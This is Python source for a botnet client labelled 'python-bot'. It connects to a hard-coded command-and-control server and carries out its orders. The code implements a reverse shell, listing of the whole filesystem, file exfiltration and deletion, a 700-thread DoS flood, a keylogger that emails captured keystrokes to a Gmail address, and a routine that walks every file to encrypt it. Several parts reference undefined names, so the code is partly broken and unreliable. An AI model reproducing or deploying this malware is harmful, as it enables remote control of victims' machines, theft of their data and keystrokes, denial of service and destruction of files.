#!/usr/bin/python
# version 1.0.2
# python-bot

import socket
import threading
import subprocess
import shlex
import getpass
import os
import random
import shutil
import smtplib
import time

from cryptography.fernet import Fernet

addr = '192.168.178.181'
port = 5555
encrKey = "dssMKeQcclJGWbClsNSGN7hiPm7UMqR7CHi7SrKZz8w="

# options: shell(*), listfs(*), upload(*), download, encr, ddos, ping(*), remove, screenshot, screencast(ffmpeg), keylogger, file-encrypter, tcp-proxy
#          ssh, 

class botOptions:
    shell = '303'
    listfs = '304'
    upload_file = '305'
    upload_dir = '306'
    download_file = '307'
    dos = '308'
    ping = '201'
    rm = '310'
    keylogger = '666'
    encrypter = '999'
    decrypter = '989'
    
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()


class pythonBot:
    
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.encr = False
        self.botsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.botsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        print(f'[**] connecting to c&c server')
        connected = False
        while not connected: 
            try:
                self.botsocket.connect((addr, port ))
                connected = True
            except Exception as e:
                print('[EE]', e)
                pass
        self.listen()
    
    def recv_encr(self, byte, client_sock):
        if self.encr:
            req = client_sock.recv(byte)
            req = decr_data(req, encrKey)
            req = req.decode
        else:
            req = client_sock.recv(byte).decode()
        return req
    
    def send_encr(self, msg, client_sock):
        if self.encr:
            msg = msg.encode()
            msg = encr_data(msg, encrKey)
            client_sock.send(msg)
        else:
            client_sock.send(msg.encode())
        return msg
    
    def module_status(self, client_sock):
        pynputOK = ''
        cryptographyOK = ''
        install = False
        try:
            import pynput
            from pynput.keyboard import Key, Listener
            pynputOK = True
        except Exception as import_error:
            try:
                pynputOK = 'pip'
                output = execute('pip install pynput')
                pynputOK = 'output'
            except Exception as executeError:
                pass
        try:
            from cryptography.fernet import Fernet
            cryptographyOK = True
            install = True
        except Exception as from_error:
            try:
                cryptographyOK = 'pip'
                output = execute('pip install cryptography')
                cryptographyOK = 'output'
            except Excpetion as executeError:
                pass        
        if pynputOK:
            pynputOK = f'[**] pynput module installed on bot [{self.addr}::{self.port}]'
        elif pynputOK == 'pip':
            pynputOK = f'[WW] pynput module failed to install on bot [{self.addr}::{self.port}]. Trying to install with pip'
        elif pynputOK == 'output':
            pynputOK = f'[WW] pip output on bot [{self.addr}::{self.port}]: {output}'
        else:
            pynputOK = f'[EE] failed to load pynput module on bot [{self.addr}::{self.port}]'
        
        if cryptographyOK:
            cryptographyOK = f'[**] cryptography module installed on bot [{self.addr}::{self.port}]'
        elif cryptographyOK == 'pip':
            cryptographyOK = f'[WW] cryptography module failed to install on bot [{self.addr}::{self.port}]. Trying to install with pip'
        elif cryptographyOK == 'output':
            cryptographyOK = f'[WW] pip output on bot [{self.addr}::{self.port}]: {output}'
        else:    
            cryptographyOK = f'[EE] failed to load cryptography module on bot [{self.addr}::{self.port}]'
        client_sock.send(pynputOK.encode())
        time.sleep(0.2)
        client_sock.send(cryptographyOK.encode())
        self.encr = install
    
    def listen(self):
        self.handle(self.botsocket)
        #self.botsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #self.botsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
        #print(f'[**] listening on {self.addr}::{self.port}')
        #self.botsocket.bind((self.addr, self.port))
        #self.botsocket.listen(5)        
        #while True:
            #client_socket, _ = self.botsocket.accept()
            #client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            #client_thread.start()
            
    def handle(self, client_socket):
        self.module_status(client_socket)
        while True:
            print('[**] waiting for orders')
            try:
                req = client_socket.recv(1024).decode()
            except Exception as e:
                print('[EE]', e)
                break
            if req == botOptions.shell:
                cmd_buffer = b''
                user = getpass.getuser()
                shell = f'{user}: #> '
                print("[**] reverse shell ready")
                #self.send_encr(shell, client_socket)            
                client_socket.send(shell.encode())
                while True:
                    try:
                        #client_socket.send(shell.encode())
                        while '@' not in cmd_buffer.decode():
                            cmd_buffer += client_socket.recv(64)
                        if '@' in cmd_buffer.decode() and '@' != cmd_buffer.decode()[-1:]:
                            cmd_buffer += client_socket.recv(64)
                        else: 
                            pass
                        cmd_buffer = cmd_buffer.decode()
                        cmd_buffer = cmd_buffer[:-1]
                        if cmd_buffer == "exit()":
                            print("[**] reverse shell closed")
                            break
                        else:
                            pass
                        response = execute(cmd_buffer)
                        if response:
                            client_socket.send(response.encode())
                        else:
                            client_socket.send(b'no response from exectute command')
                        cmd_buffer = b''
                    except Exception as e:
                        error = f'[EE] bot [{self.addr}::{self.port}] recieved error: {e}'
                        client_socket.send(error.encode())
            elif req == botOptions.listfs:
                print("[**] recieved ls-fs order")
                main_path = ''
                grep = ''
                listfs = ''
                sy = ''
                path = os.getcwd()
                
                if os.name == 'nt':
                    main_path = "C:\\"
                    sy = '\\'
                else:
                    main_path = '/'
                    sy = '/'                    
                    
                for dirpath, dirnames, files in os.walk(main_path, topdown=False):
                    listfs = listfs + (f' Directory: {dirpath} \r\n')
                    grep = grep + (f'Directory: {dirpath} \r\n')
                    for file_name in files:
                        listfs = listfs + (f'    {sy}----------> {file_name}\r\n')
                        grep = grep + (f'File: {dirpath}{sy}{file_name} \r\n')
                print("[**] sending fs to server. order completed")
                #self.send_encr(grep, client_socket)
                client_socket.send(grep.encode())
                    
            elif req == botOptions.download_file:
                file = self.recv_encr(4096, client_socket)
                file_buffer = ''
                
                try:
                    while True:
                        data = client_socket.recv(4096)
                        if data:
                            if self.encr:
                                data = decr_data(data)
                                data = data.decode()
                            else:
                                client_sock.send(file.encode())
                                data = data.decode()                        
                            file_buffer += data
                        else:
                            break
                except Exception as e:
                    error = f'[EE] bot [{self.addr}::{self.port}] recieved error: {e}'
                    self.send_encr(error, client_socket)
                    pass
                with open(file, 'w') as f:
                    f.write(file_buffer)
                f.close()
                st = f'[**] bot [{self.addr}::{self.port} executed file transmission]'
                self.send_encr(st, client_socket)
            elif req == botOptions.upload_dir:
                pass
            elif req == botOptions.upload_file:
                print('[**] upload request recieved')
                #file = self.recv_encr(1024, client_socket)
                file = client_socket.recv(1024).decode()
                #print(file)
                file_buffer = ''
                with open(file, 'r') as f:
                    file_buffer = f.read()
                f.close()
                #self.send_encr(file_buffer, client_socket)
                print('[**] sending file', file)
                client_socket.send(file_buffer.encode())
            elif req == botOptions.dos:
                msg = f'[**] bot [{self.addr}::{self.port}] is running DoS.'
                client_socket.send(msg.encode())
                target = client_sock.recv(1024)
                port = client_sock.recv(1024)
                def attack(already_connected, failed_conn):
                    bind = False
                    while True:
                        try:
                            #target = socket.gethostbyname()
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            while not bind:
                                try:
                                    port = random.randint(30, 65000)
                                    s.connect((target, port))
                                    bind = True
                                except Exception as e:
                                    pass
                            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                            s.close()
                            already_connected += 1
                            con = str(already_connected)
                            print(" (", con, ") requests sent to target.", end="\r")
            
                        except KeyboardInterrupt:
                            print(50 * " ")
                            pass
                        except socket.error:
                            failed_conn += 1
                            print(" (", failed_conn, ") connections failed!", end="\r")
                        except NameError:
                            print("")
                            pass
                        except Exception as e:
                            error = f'[EE] bot [{self.addr}::{self.port}] recieved error: {e}'
                            self.send_encr(error, client_socket)
                        end = client_socket.recv(1024)
                        if end:
                            break
                        else:
                            pass
                threads = 700
                already_con = 0
                failed_con = 0
                for i in range(threads):
                    end = client_socket.recv(1024)
                    if end:
                        i = threads
                        break
                    else:
                        pass
                    thread = threading.Thread(target=attack(already_con, failed_con))
                    thread.start()            
            elif req == botOptions.rm:
                rm = self.recv_encr(1024, client_socket)
                msg = f'[**] bot [{self.addr}::{self.port}] executed removal of {rm}'
                if os.path.exists(rm):
                    try:
                        os.remove(rm)
                    except OSError:
                        shutil.rmtree(rm)
                    self.send_encr(msg, client_sock)
                else: 
                    error = f'[EE] bot [{self.addr}::{self.port}] recieved error: file or directory does not exist'
                    self.send_encr(error, client_socket)
            elif req == botOptions.keylogger:
                global keys
                global count
                global email_char_limit
                global key_count
                global char_count
                count = 0
                email_char_limit = 500
                keys = []
                key_count = 0
                char_count = 0
            
                def send_mail():
                    with open(hostFile, 'r') as f:
                        password = f.read()
                    f.close()
                    if verboseLevel == 1:
                        print('sending email...')
                    else:
                        pass
                    server = smtplib.SMTP('smtp.gmail.com', 25)
                    server.ehlo()
                    server.starttls()
                    server.ehlo()
                    server.login(hostEmail, password)
            
                    msg = MIMEMultipart()
                    msg['From'] = 'Key Logger'
                    msg['To'] = 'mia.ryder099@gmail.com'
                    msg['Subject'] = 'Key Logger'
            
                    message = 'Log-file'
            
                    msg.attach(MIMEText(message, 'plain'))
            
                    filename = 'log.txt'
                    attachment = open(filename, 'r')
            
                    p = MIMEBase('application', 'octet-stream')
                    p.set_payload(attachment.read())
            
                    encoders.encode_base64(p)
                    p.add_header('Content-Disposition', f'attachment; filename={filename}')
                    msg.attach(p)
            
                    text = msg.as_string()
                    server.sendmail(hostEmail, targetEmail, text)
                    server.quit()
            
                def on_press(key):
                    global keys, count, char_count
                    keys.append(key)
                    count += 1
                    if verboseLevel == 1:
                        print("{0} pressed".format(key))
                    else:
                        pass
                    if key != Key.backspace:
                        char_count += 1
            
                    write_file(keys)
                    keys = []
            
                    if count == email_char_limit:
                        send_mail()
                        os.remove("log.txt")
                        count = 0
            
                def write_file(keys):
                    global key_count, char_count
                    with open("log.txt", "a") as f:
                        for key in keys:
                            k = str(key).replace("'", "")
                            Key.space
                            key_count += 1
                            if key_count == 80:
                                f.write(' -\n')
                                key_count = 0
                            elif key == Key.backspace:
                                char_count -= 1
                                if char_count > 0:
                                    f.seek(0, 2)
                                    f.seek(f.tell() - 1, 0)
                                    f.truncate()
            
                            elif key == Key.space:
                                f.write(' ')
                            elif k.find("Key") == '#':
                                f.write('#')
                            elif k.find("Key") == 'ö':
                                f.write('ö')
                            elif k.find("Key") == 'ä':
                                f.write('ä')
                            elif k.find("Key") == 'ü':
                                f.write('ü')
                            elif k.find("Key") == 'Ö':
                                f.write('Ö')
                            elif k.find("Key") == 'Ä':
                                f.write('Ä')
                            elif k.find("Key") == 'Ü':
                                f.write('Ü')
                            elif k.find("Key") == '+':
                                f.write('+')
                            elif k.find("Key") == '-':
                                f.write('-')
                            elif k.find("Key") == '_':
                                f.write('_')
                            elif k.find("Key") == ':':
                                f.write(':')
                            elif k.find("Key") == ';':
                                f.write(';')
                            elif k.find("Key") == '~':
                                f.write('~')
                            elif k.find("Key") == '*':
                                f.write('*')
                            elif k.find("Key") == -1:
                                f.write(k)
            
                def on_release():
                    end = self.recv_encr(1024, client_sock)
                    if end:
                        return False
                    else:
                        pass
            
                with Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
                with Listener(on_press=on_press) as listener:
                    listener.join()            
            elif req == botOptions.ping:
                print("[**] recieved ping order")
                ping = f'[**] bot [{self.addr}::{self.port}] is online. '
                client_socket.send(ping.encode())
                print(f'[**] ping order completed')
            
            elif req == botOptions.encrypter:
                print("[**] recieved encryption order")
                key = self.recv_encr(2048, client_socket)
                print("[**] recieved encryption key")
                print("[**] starting encryption")
                if os.name == 'nt':
                    encrPath = 'C:\''
                else:
                    encrPath = '/'
                for path, dirs, files in os.walk(encrPath):
                    for name in files:
                        file = os.path.join(path, name)
                        self.send_encr(file, client_socket)
                        print(f"[**] encrypting file: {file}")
                        """
                        with open (file, 'rb') as f:
                            data = f.read()
                        f.close()
                        data = encr_data(data, key)
                        with open (file, 'wb') as f:
                            f.write(data)
                        f.close()
                        """
                        time.sleep(0.3)
                        self.send_encr("200", client_socket)
                self.send_encr(botOptions.encrypter, client_socket)      
                 
            else:
                pass

def encr_data(fileData, key):
    fernet = Fernet(key)
    encryptedData = fernet.encrypt(fileData)
    return encryptedData    
    
def decr_data(fileData, key):
    fernet = Fernet(key)
    decryptedData = fernet.decrypt(fileData)
    return decryptedData
        
def main():
    hostResolved = True
    try:
        h_name = socket.gethostname()
        addr = socket.gethostbyname(h_name)
    except Exception as e:
        hostResolved = False
        pass
    if not hostResolved:
        addr = socket.getfqdn()  
    port = random.randint(5, 30000)
    newBot = pythonBot(addr, port)
    newBot.run()

try: 
    main()
except Exception as e:
    print(e)
    pass